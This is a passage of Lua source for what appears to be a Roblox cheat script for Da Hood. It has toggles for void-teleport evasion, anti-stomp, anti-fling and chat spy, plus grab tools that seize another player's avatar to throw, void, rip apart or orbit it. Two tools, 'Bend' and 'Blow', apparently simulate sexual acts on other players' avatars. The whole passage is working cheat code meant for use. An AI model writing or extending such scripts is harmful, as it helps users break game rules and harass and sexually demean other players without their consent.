		if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then 
			return 
		end

		local workspacePlayers = Workspace:FindFirstChild("Players")
		if not workspacePlayers then return end

		local voided = false

		for _, player in pairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then

				local char = workspacePlayers:FindFirstChild(player.Name) or player.Character
				if char and char:FindFirstChild("HumanoidRootPart") then
					
					-- Check if holding brown bag
					local holdingBag = char:FindFirstChild("[BrownBag]")
					
					if holdingBag then
						local dist = (char.HumanoidRootPart.Position - myChar.HumanoidRootPart.Position).Magnitude
						
						if dist <= 25 then
							local hum = char:FindFirstChildOfClass("Humanoid")
							if hum then
								for _, track in pairs(hum:GetPlayingAnimationTracks()) do
									if track.Animation and string.find(tostring(track.Animation.AnimationId), "3493406987") then
										voided = true
										break
									end
								end
							end
						end
					end
				end
			end
			if voided then break end
		end

		if voided then
			local SavedPosition = hrp.CFrame
			local hrp = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
			hrp.CFrame = VoidCFrame
			RunService:BindToRenderStep('Restoreantibag', 199, function()
				hrp.CFrame = SavedPosition
				RunService:UnbindFromRenderStep('Restoreantibag')
			end)
		end
	end
end
game:GetService("RunService").Heartbeat:Connect(function()
    if vanhuyhandsome then 
		checkAntiBag()

		if Toggles.AntiFlame and Toggles.AntiFlame.Value then
			local anyThreat = false
			local anyVulnerable = false

			for name, enabled in pairs(Options.antiflametargets.Value or {}) do
				if enabled then
					local p = Players:FindFirstChild(name)
					if p and p.Character then
						if isThreat(p) then
							anyThreat = true
						end
						if isVulnerable(p) then
							anyVulnerable = true
						end
					end
				end
			end

			if anyThreat then
				-- HIDE
				local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				if hrp then
					local SavedPosition = hrp.CFrame
					hrp.CFrame = CFrame.new(9e9, 9e9, 9e9)
					hrp.Velocity = Vector3.new(0,0,0)
					hrp.AssemblyLinearVelocity = Vector3.new(0,0,0)
					RunService:BindToRenderStep('Restoreantiflame', 199, function()
						hrp.CFrame = SavedPosition
						RunService:UnbindFromRenderStep('Restoreantiflame')
					end)
				end
			end
		end
	end
    if Toggles.antifling.Value and LocalPlayer and LocalPlayer.Character then
        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CanCollide = false
        end
    end
end)
CharacterBox:AddButton({
    Text = 'Force Reset',
    Func = function()
        local hum = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
        if hum then
            hum.Health = 0
        end
    end,
})
local maxzoom = Players.LocalPlayer.CameraMaxZoomDistance

PlayerBox:AddToggle('InfZoom', {
    Text = 'Infinite Zoom',
    Default = false,
    Callback = function(v)
        if v then
            Players.LocalPlayer.CameraMaxZoomDistance = math.huge
        else
            Players.LocalPlayer.CameraMaxZoomDistance = maxzoom
        end
    end,
})
local TextChatService = game:GetService('TextChatService')
local chatWindow = TextChatService:FindFirstChild('ChatWindowConfiguration')

PlayerBox:AddToggle('ChatSpy', {
    Text = 'Chat Spy',
    Default = true,
    Callback = function(v)
        if chatWindow then
            chatWindow.Enabled = v
        end
    end,
})
if Toggles.ChatSpy.Value and chatWindow then
    chatWindow.Enabled = true
end
if isDaHood then
    local antiStompActive = true
    local antiStompActivev2 = true

    local flashbackActive = false
    local lastPosition = nil
    local antiStompConnection = nil

    function startAntiStomp()
        function setupCharacter(chr)
            local hum = chr:WaitForChild('Humanoid', 5)
            local bodyEffects = chr:WaitForChild('BodyEffects', 5)

            if not hum or not bodyEffects then
                return
            end

            local koValue = bodyEffects:WaitForChild('K.O', 5)

            if not koValue then
                return
            end
            if antiStompConnection then
                antiStompConnection:Disconnect()

                antiStompConnection = nil
            end

            antiStompConnection = RunService.Heartbeat:Connect(function()
                if not antiStompActivev2 then
                    antiStompConnection:Disconnect()

                    antiStompConnection = nil

                    return
                end
                if koValue.Value == true and hum.Health > 0 then
                    if flashbackActive then
                        local root = chr:FindFirstChild('HumanoidRootPart')

                        if root then
                            lastPosition = root.CFrame
                        end
                    end

                    hum.Health = 0
                end
            end)
        end

        if LocalPlayer.Character then
            setupCharacter(LocalPlayer.Character)
        end

        LocalPlayer.CharacterAdded:Connect(function(newCharacter)
            if not antiStompActivev2 then
                return
            end

            setupCharacter(newCharacter)

            if flashbackActive and lastPosition then
                local root = newCharacter:WaitForChild('HumanoidRootPart', 5)

                if root then
                    root.CFrame = lastPosition
                end

                lastPosition = nil
            end
        end)
    end
    startAntiStomp()
    PlayerBox:AddToggle('AntiStomp', {
        Text = 'Anti Stomp v1+v2',
        Default = true,
        Callback = function(state)
            antiStompActivev2 = state
            antiStompActive = state

            if state then
                startAntiStomp()
            end
        end,
    })
    PlayerBox:AddToggle('Flashback', {
        Text = 'Flashback',
        Default = false,
        Callback = function(state)
            flashbackActive = state
        end,
    })

    local lastDeathPosition = nil

    RunService.Heartbeat:Connect(function()
        local chr = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hum = chr:FindFirstChildOfClass('Humanoid')

        if not hum then
            return
        end

        local bodyEffects = chr:FindFirstChild('BodyEffects')

        if not bodyEffects then
            return
        end

        local koValue = bodyEffects:FindFirstChild('K.O')

        if antiStompActive then
            if hum.Health <= 5 or (koValue and koValue.Value) then
                local tool = chr:FindFirstChildOfClass('Tool')

                if tool then
                    tool.Parent = LocalPlayer.Backpack
                end

                for _, v in pairs(chr:GetChildren())do
                    if v:IsA('MeshPart') or v:IsA('Part') then
                        v:Destroy()
                    end
                end
                for _, v in pairs(chr:GetChildren())do
                    if v:IsA('Accessory') then
                        if v:FindFirstChild('Handle') then
                            v.Handle:Destroy()
                        end
                    end
                end
            end
        end
    end)
end

do
        if isDaHood then
            local LocalPlayer = game:GetService('Players').LocalPlayer
            local RunService = game:GetService('RunService')
            local ReplicatedStorage = game:GetService('ReplicatedStorage')
            local Grabbed = false
            local Up = false
            local ToolStates = {
                Neckgrab = false,
                Up = false,
                Air = false,
                Throw = false,
                HeavenThrow = false,
                Punch = false,
                RipInHalf = false,
                Void = false,
                Orbit = false,
                Bend = false,
                Blow = false,
            }

            function CreateNeckgrabTool()
                local tool = Instance.new('Tool')

                tool.RequiresHandle = false
                tool.Name = 'Activate Neckgrab'
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    ReplicatedStorage.MainEvent:FireServer('Grabbing', true)

                    repeat
                        task.wait(0.1)
                    until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('BodyEffects') and LocalPlayer.Character.BodyEffects:FindFirstChild('Grabbed') and LocalPlayer.Character.BodyEffects.Grabbed.Value ~= nil and LocalPlayer.Character.BodyEffects.Grabbed.Value ~= ''

                    local targetName = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)
                    local targetPlayer = Players:FindFirstChild(targetName)

                    if not targetPlayer or not targetPlayer.Character then
                        return
                    end

                    local targetChar = targetPlayer.Character
                    local targetTorso = targetChar:FindFirstChild('UpperTorso')

                    if not targetTorso then
                        return
                    end

                    Grabbed = true

                    local constraint = targetChar:FindFirstChild('GRABBING_CONSTRAINT')

                    if constraint and constraint:FindFirstChild('H') then
                        constraint.H.Length = math.huge
                    end

                    for _, track in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do
                        if track.Animation.AnimationId == 'rbxassetid://11075367458' then
                            track:Stop()
                        end
                    end

                    task.spawn(function()
                        local anim = Instance.new('Animation')

                        anim.AnimationId = 'rbxassetid://3135389157'

                        local loaded = LocalPlayer.Character.Humanoid:LoadAnimation(anim)

                        loaded.Priority = Enum.AnimationPriority.Action

                        loaded:Play()
                        loaded:AdjustSpeed(0.2)
                        wait(0.8)
                        loaded:AdjustSpeed(0)
                    end)

                    if not targetTorso:FindFirstChild('BodyPosition') then
                        local bodypos = Instance.new('BodyPosition')

                        bodypos.Name = 'BodyPosition'
                        bodypos.D = 200
                        bodypos.MaxForce = Vector3.new(10000, 10000, 10000)
                        bodypos.Parent = targetTorso
                    end
                    if not targetTorso:FindFirstChild('BodyGyro') then
                        local bodygyro = Instance.new('BodyGyro')

                        bodygyro.Name = 'BodyGyro'
                        bodygyro.D = 100
                        bodygyro.MaxTorque = Vector3.new(10000, 10000, 10000)
                        bodygyro.Parent = targetTorso
                    end

                    RunService:BindToRenderStep('Pos', Enum.RenderPriority.Character.Value, function()
                        local hand = LocalPlayer.Character:FindFirstChild('RightHand')
                        local root = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                        if hand and root then
                            targetTorso.BodyPosition.Position = hand.Position + Vector3.new(0, -0.7, 0)
                            targetTorso.BodyGyro.CFrame = CFrame.new(targetTorso.Position, root.Position)
                        end
                    end)
                    LocalPlayer.Character.BodyEffects.Grabbed:GetPropertyChangedSignal('Value'):Connect(function()
                        if LocalPlayer.Character.BodyEffects.Grabbed.Value == nil or LocalPlayer.Character.BodyEffects.Grabbed.Value == '' then
                            Grabbed = false
                            Up = false

                            RunService:UnbindFromRenderStep('Pos')

                            for _, track in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do
                                local id = track.Animation.AnimationId

                                if id == 'rbxassetid://3135389157' or id == 'rbxassetid://14496531574' or id == 'rbxassetid://3096047107' then
                                    track:Stop()
                                end
                            end

                            if targetTorso:FindFirstChild('BodyPosition') then
                                targetTorso.BodyPosition:Destroy()
                            end
                            if targetTorso:FindFirstChild('BodyGyro') then
                                targetTorso.BodyGyro:Destroy()
                            end
                        end
                    end)
                end)
            end
            function CreateUpTool()
                local tool = Instance.new('Tool')

                tool.RequiresHandle = false
                tool.Name = 'Up'
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    if Grabbed == true then
                        if Up == false then
                            local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)

                            Up = true

                            for _, Track in pairs(LocalPlayer.Character:WaitForChild('Humanoid'):GetPlayingAnimationTracks())do
                                if Track.Animation.AnimationId == 'rbxassetid://3135389157' then
                                    Track:Stop()
                                end
                            end

                            spawn(function()
                                local Animation = Instance.new('Animation')

                                Animation.AnimationId = 'rbxassetid://14496531574'

                                local LoadAnimation = LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Animation)

                                LoadAnimation.Priority = Enum.AnimationPriority.Action

                                LoadAnimation:Play()
                                LoadAnimation:AdjustSpeed(1)
                                wait(1)
                                LoadAnimation:AdjustSpeed(0)
                            end)
                            spawn(function()
                                wait(0.3)
                                RunService:UnbindFromRenderStep('Pos')
                                wait(0.05)
                                RunService:BindToRenderStep('Pos', 0, function()
                                    Players[target].Character.UpperTorso.BodyPosition.Position = LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 8 + Vector3.new(0, 23, 0)
                                    Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(Players[target].Character.UpperTorso.Position, LocalPlayer.Character.HumanoidRootPart.Position)
                                end)

                                Players[target].Character.UpperTorso.BodyPosition.D = 1200
                            end)
                        else
                            for _, Track in pairs(LocalPlayer.Character:WaitForChild('Humanoid'):GetPlayingAnimationTracks())do
                                if Track.Animation.AnimationId == 'rbxassetid://14496531574' then
                                    Track:Stop(1)
                                end
                            end

                            spawn(function()
                                wait(0.45)

                                local Animation = Instance.new('Animation')

                                Animation.AnimationId = 'rbxassetid://3135389157'

                                local LoadAnimation = LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Animation)

                                LoadAnimation.Priority = Enum.AnimationPriority.Action

                                LoadAnimation:Play()
                                LoadAnimation:AdjustSpeed(0.2)
                                task.wait(0.8)
                                LoadAnimation:AdjustSpeed(0)
                            end)

                            local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)

                            RunService:UnbindFromRenderStep('Pos')

                            Up = false

                            RunService:BindToRenderStep('Pos', 0, function()
                                Players[target].Character.UpperTorso.BodyPosition.Position = LocalPlayer.Character.RightHand.Position + Vector3.new(0, -0.7, 0)
                                Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(Players[target].Character.UpperTorso.Position, LocalPlayer.Character.HumanoidRootPart.Position)
                            end)
                            wait(1)

                            Players[target].Character.UpperTorso.BodyPosition.D = 200
                        end
                    end
                end)
            end
            function CreateAirTool()
                local tool = Instance.new('Tool')

                tool.RequiresHandle = false
                tool.Name = 'Air'
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    if Grabbed == true then
                        if Up == false then
                            local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)

                            Up = true

                            for _, Track in pairs(LocalPlayer.Character:WaitForChild('Humanoid'):GetPlayingAnimationTracks())do
                                if Track.Animation.AnimationId == 'rbxassetid://3135389157' then
                                    Track:Stop()
                                end
                            end

                            spawn(function()
                                local Animation = Instance.new('Animation')

                                Animation.AnimationId = 'rbxassetid://14496531574'

                                local LoadAnimation = LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Animation)

                                LoadAnimation.Priority = Enum.AnimationPriority.Action

                                LoadAnimation:Play()
                                LoadAnimation:AdjustSpeed(1)
                                wait(1)
                                LoadAnimation:AdjustSpeed(0)
                            end)
                            spawn(function()
                                wait(0.3)
                                RunService:UnbindFromRenderStep('Pos')
                                wait(0.05)
                                RunService:BindToRenderStep('Pos', 0, function()
                                    local char = LocalPlayer.Character
                                    local targetChar = Players[target].Character
                                    local behindPosition = char.HumanoidRootPart.Position - char.HumanoidRootPart.CFrame.LookVector * 5 + Vector3.new(0, 9, 0)

                                    targetChar.UpperTorso.BodyPosition.Position = behindPosition
                                    targetChar.UpperTorso.BodyGyro.CFrame = CFrame.new(targetChar.UpperTorso.Position, char.HumanoidRootPart.Position)
                                end)

                                Players[target].Character.UpperTorso.BodyPosition.D = 1200
                            end)
                        else
                            for _, Track in pairs(LocalPlayer.Character:WaitForChild('Humanoid'):GetPlayingAnimationTracks())do
                                if Track.Animation.AnimationId == 'rbxassetid://14496531574' then
                                    Track:Stop(1)
                                end
                            end

                            spawn(function()
                                wait(0.45)

                                local Animation = Instance.new('Animation')

                                Animation.AnimationId = 'rbxassetid://3135389157'

                                local LoadAnimation = LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Animation)

                                LoadAnimation.Priority = Enum.AnimationPriority.Action

                                LoadAnimation:Play()
                                LoadAnimation:AdjustSpeed(0.2)
                                task.delay(2, function()
                                    LoadAnimation:Stop()
                                end)
                                task.wait(0.8)
                                LoadAnimation:AdjustSpeed(0)
                            end)

                            local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)

                            RunService:UnbindFromRenderStep('Pos')

                            Up = false

                            RunService:BindToRenderStep('Pos', 0, function()
                                local char = LocalPlayer.Character
                                local targetChar = Players[target].Character

                                targetChar.UpperTorso.BodyPosition.Position = char.RightHand.Position + Vector3.new(0, -0.7, 0)
                                targetChar.UpperTorso.BodyGyro.CFrame = CFrame.new(targetChar.UpperTorso.Position, char.HumanoidRootPart.Position)
                            end)
                            wait(1)

                            Players[target].Character.UpperTorso.BodyPosition.D = 200
                        end
                    end
                end)
            end
            function CreateThrowTool()
                local tool = Instance.new('Tool')

                tool.RequiresHandle = false
                tool.Name = 'Throw'
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    if Grabbed == true then
                        if Up == false then
                            local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)

                            for _, Track in pairs(LocalPlayer.Character:WaitForChild('Humanoid'):GetPlayingAnimationTracks())do
                                if Track.Animation.AnimationId == 'rbxassetid://3135389157' then
                                    Track:Stop()
                                end
                            end

                            local Animation = Instance.new('Animation')

                            Animation.AnimationId = 'rbxassetid://3096047107'

                            local LoadAnimation = LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Animation)

                            LoadAnimation.Priority = Enum.AnimationPriority.Action

                            LoadAnimation:Play()
                            LoadAnimation:AdjustSpeed(1)
                            wait(0.2)

                            Players[target].Character.UpperTorso.BodyPosition.D = 900

                            RunService:UnbindFromRenderStep('Pos')
                            Players[target].Character.UpperTorso:FindFirstChild('BodyGyro'):Destroy()

                            Players[target].Character.UpperTorso.BodyPosition.Position = LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 150 + Vector3.new(0, 5, 0)

                            wait(0.5)
                            Players[target].Character.UpperTorso:FindFirstChild('BodyPosition'):Destroy()
                            ReplicatedStorage.MainEvent:FireServer('Grabbing', false)
                        end
                    end
                end)
            end
            function CreateHeavenThrowTool()
                local tool = Instance.new('Tool')

                tool.RequiresHandle = false
                tool.Name = 'Heaven Throw'
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    if Grabbed == true then
                        if Up == false then
                            local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)

                            for _, Track in pairs(LocalPlayer.Character:WaitForChild('Humanoid'):GetPlayingAnimationTracks())do
                                if Track.Animation.AnimationId == 'rbxassetid://3135389157' then
                                    Track:Stop()
                                end
                            end

                            local Animation = Instance.new('Animation')

                            Animation.AnimationId = 'rbxassetid://14496531574'

                            local LoadAnimation = LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Animation)

                            LoadAnimation.Priority = Enum.AnimationPriority.Action

                            LoadAnimation:Play()
                            LoadAnimation:AdjustSpeed(1)
                            wait(0.4)
                            RunService:UnbindFromRenderStep('Pos')
                            Players[target].Character.UpperTorso:FindFirstChild('BodyGyro'):Destroy()
                            wait(0.01)

                            Players[target].Character.UpperTorso.BodyPosition.D = 200
                            Players[target].Character.UpperTorso.BodyPosition.Position = LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 3 + Vector3.new(0, 3000, 0)

                            wait(2)
                            ReplicatedStorage.MainEvent:FireServer('Grabbing', false)
                        end
                    end
                end)
            end
            function CreatePunchTool()
                local tool = Instance.new('Tool')

                tool.RequiresHandle = false
                tool.Name = 'Punch'
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    if Grabbed == true then
                        if Up == false then
                            local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)

                            for _, Track in pairs(LocalPlayer.Character:WaitForChild('Humanoid'):GetPlayingAnimationTracks())do
                                if Track.Animation.AnimationId == 'rbxassetid://3135389157' then
                                    Track:Stop()
                                end
                            end

                            RunService:UnbindFromRenderStep('Pos')
                            RunService:BindToRenderStep('Pos', 0, function()
                                Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(Players[target].Character.UpperTorso.Position, LocalPlayer.Character.HumanoidRootPart.Position)
                            end)

                            Players[target].Character.UpperTorso.BodyPosition.D = 3400
                            Players[target].Character.UpperTorso.BodyPosition.Position = LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 3 + Vector3.new(0, 1, 0)

                            local Animation = Instance.new('Animation')

                            Animation.AnimationId = 'rbxassetid://3354696735'

                            local LoadAnimation = LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Animation)

                            LoadAnimation.Priority = Enum.AnimationPriority.Action

                            LoadAnimation:Play()
                            wait(1)
                            Players[target].Character.UpperTorso:FindFirstChild('BodyPosition'):Destroy()
                            RunService:UnbindFromRenderStep('Pos')
                            Players[target].Character.UpperTorso:FindFirstChild('BodyGyro'):Destroy()

                            for i = 1, 2 do
                                wait()

                                Players[target].Character.UpperTorso.Velocity = Vector3.new(LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector.X * 950, -200, LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector.Z * 950)
                            end
                        end
                    end

                    wait(1)
                    ReplicatedStorage.MainEvent:FireServer('Grabbing', false)
                end)
            end
            function CreateRipInHalfTool()
                local tool = Instance.new('Tool')

                tool.RequiresHandle = false
                tool.Name = 'Rip In Half'
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    if Grabbed == true then
                        if Up == false then
                            local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)

                            for _, Track in pairs(LocalPlayer.Character:WaitForChild('Humanoid'):GetPlayingAnimationTracks())do
                                if Track.Animation.AnimationId == 'rbxassetid://3135389157' then
                                    Track:Stop()
                                end
                            end

                            local Animation1 = Instance.new('Animation')

                            Animation1.AnimationId = 'rbxassetid://13850666420'

                            local LoadAnimation1 = LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Animation1)

                            LoadAnimation1.Priority = Enum.AnimationPriority.Action

                            LoadAnimation1:Play()

                            local Animation2 = Instance.new('Animation')

                            Animation2.AnimationId = 'rbxassetid://13850675130'

                            local LoadAnimation2 = LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Animation2)

                            LoadAnimation2.Priority = Enum.AnimationPriority.Action

                            LoadAnimation2:Play()
                            RunService:UnbindFromRenderStep('Pos')
                            RunService:BindToRenderStep('Pos', 0, function()
                                Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(Players[target].Character.UpperTorso.Position, LocalPlayer.Character.HumanoidRootPart.Position)
                                Players[target].Character.UpperTorso.BodyPosition.Position = LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 2 + Vector3.new(0, 0.2, 0)
                            end)
                            task.wait(0.2)

                            Players[target].Character.LowerTorso.Position = Vector3.new(0, -12E2, 0)

                            RunService:UnbindFromRenderStep('Pos')
                            task.wait(0.2)
                            Players[target].Character.UpperTorso:FindFirstChild('BodyPosition'):Destroy()
                            Players[target].Character.UpperTorso:FindFirstChild('BodyGyro'):Destroy()
                            task.wait(0.1)

                            Players[target].Character.UpperTorso.Velocity = LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * 90
                            Players[target].Character.RightUpperLeg.Velocity = LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90
                            Players[target].Character.LeftUpperLeg.Velocity = LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90

                            task.wait(0.3)
                            ReplicatedStorage.MainEvent:FireServer('Grabbing', false)
                            task.wait(0.2)
                            LoadAnimation1:Stop(0.3)
                            LoadAnimation2:Stop(0.3)
                        end
                    end
                end)
            end
            function CreateVoidTool()
                local tool = Instance.new('Tool')

                tool.RequiresHandle = false
                tool.Name = 'Void'
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    if Grabbed == true then
                        if Up == false then
                            local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)

                            wait(0.3)

                            for _, Track in pairs(LocalPlayer.Character:WaitForChild('Humanoid'):GetPlayingAnimationTracks())do
                                if Track.Animation.AnimationId == 'rbxassetid://3135389157' then
                                    Track:Stop()
                                end
                            end

                            Players[target].Character.UpperTorso.BodyPosition.D = 1200

                            RunService:UnbindFromRenderStep('Pos')
                            RunService:BindToRenderStep('Pos', 0, function()
                                Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(Players[target].Character.UpperTorso.Position, LocalPlayer.Character.HumanoidRootPart.Position)
                            end)

                            Players[target].Character.UpperTorso.BodyPosition.Position = LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 4 + Vector3.new(0, 1.4, 0)

                            local Animation = Instance.new('Animation')

                            Animation.AnimationId = 'rbxassetid://14774699952'

                            local LoadAnimation = LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Animation)

                            LoadAnimation.Priority = Enum.AnimationPriority.Action

                            LoadAnimation:Play()
                            LoadAnimation:AdjustSpeed(0.4)
                            wait(2)
                            Players[target].Character.UpperTorso:FindFirstChild('BodyPosition'):Destroy()
                            Players[target].Character.UpperTorso:FindFirstChild('BodyGyro'):Destroy()

                            for _, v in pairs(Players[target].Character:GetChildren())do
                                if v:IsA('MeshPart') then
                                    v.Position = Vector3.new(0, -600, 0)
                                end
                            end

                            wait(0.2)
                            LoadAnimation:Stop()
                            ReplicatedStorage.MainEvent:FireServer('Grabbing', false)
                        end
                    end
                end)
            end

            local orbiting = false
            local theta = 0
            local orbitConnection

            function CreateOrbitTool()
                local tool = Instance.new('Tool')

                tool.RequiresHandle = false
                tool.Name = 'Orbit'
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    if Grabbed ~= true then
                        return
                    end

                    local targetName = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)
                    local targetPlayer = Players:FindFirstChild(targetName)

                    if not targetPlayer or not targetPlayer.Character then
                        return
                    end

                    local targetChar = targetPlayer.Character
                    local targetTorso = targetChar:FindFirstChild('UpperTorso')

                    if not targetTorso then
                        return
                    end
                    if not targetTorso:FindFirstChild('BodyPosition') then
                        local bp = Instance.new('BodyPosition')

                        bp.Name = 'BodyPosition'
                        bp.D = 200
                        bp.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                        bp.Parent = targetTorso
                    end
                    if not targetTorso:FindFirstChild('BodyGyro') then
                        local bg = Instance.new('BodyGyro')

                        bg.Name = 'BodyGyro'
                        bg.D = 100
                        bg.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
                        bg.Parent = targetTorso
                    end
                    if orbiting then
                        orbiting = false

                        if orbitConnection then
                            orbitConnection:Disconnect()

                            orbitConnection = nil
                        end

                        RunService:BindToRenderStep('Pos', 0, function()
                            local hand = LocalPlayer.Character:FindFirstChild('RightHand')

                            if hand then
                                targetTorso.BodyPosition.Position = hand.Position + Vector3.new(0, -0.7, 0)
                                targetTorso.BodyGyro.CFrame = CFrame.new(targetTorso.Position, LocalPlayer.Character.HumanoidRootPart.Position)
                            end
                        end)

                        targetTorso.BodyPosition.D = 200
                    else
                        orbiting = true
                        theta = 0

                        if orbitConnection then
                            orbitConnection:Disconnect()
                        end

                        orbitConnection = RunService.RenderStepped:Connect(function()
                            local root = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                            if not root then
                                return
                            end

                            theta += 0.6

                            local radius = 20
                            local height = 3
                            local offset = Vector3.new(math.cos(theta) * radius, height, math.sin(theta) * radius)
                            local orbitPos = root.Position + offset

                            targetTorso.BodyPosition.Position = orbitPos
                            targetTorso.BodyGyro.CFrame = CFrame.new(targetTorso.Position, root.Position)
                        end)
                        targetTorso.BodyPosition.D = 1200
                    end
                end)
            end

            local IM = game:GetService('ReplicatedStorage').IM.ANIM
            local PlayersChar = workspace.Players

            if _G.JOINTWATCHER then
                _G.JOINTWATCHER:Disconnect()
            end

            function Align(P0, P1, P, R)
                local A0, A1 = Instance.new('Attachment', P0), Instance.new('Attachment', P1)
                local AP, AO = Instance.new('AlignPosition', P0), Instance.new('AlignOrientation', P0)

                A1.Position = P
                A0.Rotation = R
                AP.RigidityEnabled = true
                AP.Responsiveness = 200
                AP.Attachment0 = A0
                AP.Attachment1 = A1
                AO.MaxTorque = 9e9
                AO.Responsiveness = 200
                AO.RigidityEnabled = true
                AO.Attachment0 = A0
                AO.Attachment1 = A1

                return A0, A1, AP, A0
            end
            function CreateBendTool()
                local tool = Instance.new('Tool')

                tool.Name = 'Bend'
                tool.RequiresHandle = false
                tool.CanBeDropped = false
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
                        if Ins:IsA('Weld') and Ins.Name == 'GRABBING_CONSTRAINT' then
                            repeat
                                task.wait()
                            until Ins.Part0 ~= nil
                            repeat
                                task.wait()
                            until Ins:FindFirstChildOfClass('RopeConstraint')

                            local AT0, AT1, AP, A0

                            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                                Ins:FindFirstChildOfClass('RopeConstraint').Length = 9e9
                                LocalPlayer.Character.Animate.Disabled = true

                                for _, Anim in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do
                                    Anim:Stop()
                                end

                                LocalPlayer.Character.Animate.Disabled = false

                                LocalPlayer.Character.Humanoid:LoadAnimation(IM.RightAim):Play()
                                LocalPlayer.Character.Humanoid:LoadAnimation(IM.LeftAim):Play()

                                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, -2), Vector3.new(45, 0, 0))

                                spawn(function()
                                    while Ins.Parent ~= nil do
                                        task.wait()

                                        local Sine = tick() * 60

                                        AT1.Position = Vector3.new(0, -0.5, -4 + 1 * math.sin(Sine / 8))
                                    end
                                end)
                            end

                            repeat
                                task.wait()
                            until Ins.Parent == nil

                            LocalPlayer.Character.Animate.Disabled = true

                            for _, Anim in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do
                                Anim:Stop()
                            end

                            LocalPlayer.Character.Animate.Disabled = false

                            AT0:Destroy()
                            AT1:Destroy()
                            AP:Destroy()
                            A0:Destroy()
                        end
                    end)
                end)
            end
            function CreateBlowTool()
                local tool = Instance.new('Tool')

                tool.Name = 'Blow'
                tool.RequiresHandle = false
                tool.CanBeDropped = false
                tool.Parent = LocalPlayer.Backpack

                tool.Activated:Connect(function()
                    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
                        if Ins:IsA('Weld') and Ins.Name == 'GRABBING_CONSTRAINT' then
                            repeat
                                task.wait()
                            until Ins.Part0 ~= nil
                            repeat
                                task.wait()
                            until Ins:FindFirstChildOfClass('RopeConstraint')

                            local AT0, AT1, AP, A0

                            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                                Ins:FindFirstChildOfClass('RopeConstraint').Length = 9e9
                                LocalPlayer.Character.Animate.Disabled = true

